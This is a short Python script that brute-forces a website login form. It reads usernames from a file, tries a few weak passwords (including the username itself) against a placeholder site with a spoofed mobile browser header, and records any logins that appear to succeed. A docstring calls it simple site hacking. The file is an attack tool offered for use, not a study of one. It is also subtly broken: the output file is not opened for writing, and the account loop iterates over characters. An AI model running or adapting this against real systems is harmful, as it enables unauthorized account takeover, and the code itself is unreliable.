import requests
import multiprocessing


def blast(account):
    url = "http://xxx.com"
    headers = {
        "Referer": "http://xxx.com",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 "
                      "(KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
    }
    passwords = ["123456", "asdqwe", account]

    for password in passwords:
        print("using password >>> " + password)
        data = {
            "log": account,
            "psw": password
        }
        response = requests.post(url, headers=headers, data=data)
        if not response.history:
            continue
        else:
            file = open("success.txt", encoding="utf-8")
            file.write("User:")
            file.write(account)
            file.write("    Password:")
            file.write(password)
            file.write("Success!")

            return True


accounts = open("account.txt", "r", encoding="utf-8")

if __name__ == '__main__':

    """
        Python日站简易版
    """
    for account in accounts.readline():
        print("current account >>> " + account)
        # multiprocess = multiprocessing.Process(target=blast,args=account)
        # multiprocess.start()
        blast(account)
